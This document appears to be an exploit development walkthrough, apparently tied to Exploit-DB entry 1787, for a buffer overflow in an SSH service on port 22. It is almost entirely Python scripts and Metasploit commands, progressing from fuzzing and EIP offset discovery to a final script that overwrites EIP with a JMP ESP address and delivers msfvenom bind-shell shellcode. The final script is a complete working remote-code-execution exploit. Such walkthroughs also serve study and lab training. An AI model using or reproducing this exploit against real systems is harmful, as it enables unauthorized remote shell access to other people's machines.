https://www.exploit-db.com/exploits/1787


#### FuzzerA.py
```
#!/usr/bin/python

import socket, sys
import time 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message 

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer += "A" * 22000

buffer += "\r\n"


sock.send(buffer)

time.sleep(5)

sock.close()

```


Because of the large size (22000), we are going to output the pattern to a file, then open the file in the exploit.

```
msf-pattern_create -l 22000 > dump
```

---
#### FuzzerB.py
```
#!/usr/bin/python

import socket, sys
import time 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message 

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer += open("dump", "rb").read(22000)

buffer += "\r\n"


sock.send(buffer)

time.sleep(5)

sock.close()

```
---

EIP = 326A4231

```
msf-pattern_offset -l 22000 -q 326A4231
```

1055

This program will send a 22000-byte attack to the server, consisting of 1055 'A' characters followed by 'BBBB' which should end up in the EIP, and enough 'C' characters to make the total 22000 bytes long.



Notice above how the ESP and the C's are offset, the ESP is 4 further into C's than it should be. Below, we add in D's to better display this issue.


---
#### FuzzerC.py
```
#!/usr/bin/python

import socket, sys
import time 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message 

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer += "A" * 1055

buffer += "BBBB"

buffer += "CCCC"

buffer += "D" * (22000 - len(buffer))

buffer += "\r\n"


sock.send(buffer)

time.sleep(5)

sock.close()

```
---

---
#### FuzzerD.py
```
#!/usr/bin/python

import socket, sys
import time 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message 

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer += "A" * 1055

buffer += "BBBB"

buffer += "CCCC"

buffer += (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
)


buffer += "D" * (22000 - len(buffer))

buffer += "\r\n"


sock.send(buffer)

time.sleep(5)

sock.close()

```
---


```
msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0A\x0D\x20"
```

Now we find a JMP ESP in USER32.dll


7E429353

---
#### FuzzerE.py
```
#!/usr/bin/python

import socket, sys
import time 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message 

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer += "A" * 1055

buffer += "\x53\x93\x42\x7E"

buffer += "CCCC"

buffer += "\x90" * 100

buffer+= (
"\xb8\x5f\xd8\xcc\x1c\xdb\xdf\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x53\x83\xc3\x04\x31\x43\x0e\x03\x1c\xd6\x2e\xe9\x5e\x0e\x2c"
"\x12\x9e\xcf\x51\x9a\x7b\xfe\x51\xf8\x08\x51\x62\x8a\x5c\x5e"
"\x09\xde\x74\xd5\x7f\xf7\x7b\x5e\x35\x21\xb2\x5f\x66\x11\xd5"
"\xe3\x75\x46\x35\xdd\xb5\x9b\x34\x1a\xab\x56\x64\xf3\xa7\xc5"
"\x98\x70\xfd\xd5\x13\xca\x13\x5e\xc0\x9b\x12\x4f\x57\x97\x4c"
"\x4f\x56\x74\xe5\xc6\x40\x99\xc0\x91\xfb\x69\xbe\x23\x2d\xa0"
"\x3f\x8f\x10\x0c\xb2\xd1\x55\xab\x2d\xa4\xaf\xcf\xd0\xbf\x74"
"\xad\x0e\x35\x6e\x15\xc4\xed\x4a\xa7\x09\x6b\x19\xab\xe6\xff"
"\x45\xa8\xf9\x2c\xfe\xd4\x72\xd3\xd0\x5c\xc0\xf0\xf4\x05\x92"
"\x99\xad\xe3\x75\xa5\xad\x4b\x29\x03\xa6\x66\x3e\x3e\xe5\xee"
"\xf3\x73\x15\xef\x9b\x04\x66\xdd\x04\xbf\xe0\x6d\xcc\x19\xf7"
"\x92\xe7\xde\x67\x6d\x08\x1f\xae\xaa\x5c\x4f\xd8\x1b\xdd\x04"
"\x18\xa3\x08\xb0\x10\x02\xe3\xa7\xdd\xf4\x53\x68\x4d\x9d\xb9"
"\x67\xb2\xbd\xc1\xad\xdb\x56\x3c\x4e\xf2\xfa\xc9\xa8\x9e\x12"
"\x9c\x63\x36\xd1\xfb\xbb\xa1\x2a\x2e\x94\x45\x62\x38\x23\x6a"
"\x73\x6e\x03\xfc\xf8\x7d\x97\x1d\xff\xab\xbf\x4a\x68\x21\x2e"
"\x39\x08\x36\x7b\xa9\xa9\xa5\xe0\x29\xa7\xd5\xbe\x7e\xe0\x28"
"\xb7\xea\x1c\x12\x61\x08\xdd\xc2\x4a\x88\x3a\x37\x54\x11\xce"
"\x03\x72\x01\x16\x8b\x3e\x75\xc6\xda\xe8\x23\xa0\xb4\x5a\x9d"
"\x7a\x6a\x35\x49\xfa\x40\x86\x0f\x03\x8d\x70\xef\xb2\x78\xc5"
"\x10\x7a\xed\xc1\x69\x66\x8d\x2e\xa0\x22\xbd\x64\xe8\x03\x56"
"\x21\x79\x16\x3b\xd2\x54\x55\x42\x51\x5c\x26\xb1\x49\x15\x23"
"\xfd\xcd\xc6\x59\x6e\xb8\xe8\xce\x8f\xe9"
)


buffer += "D" * (22000 - len(buffer))


buffer += "\r\n"


sock.send(buffer)

time.sleep(5)

sock.close()

```
---

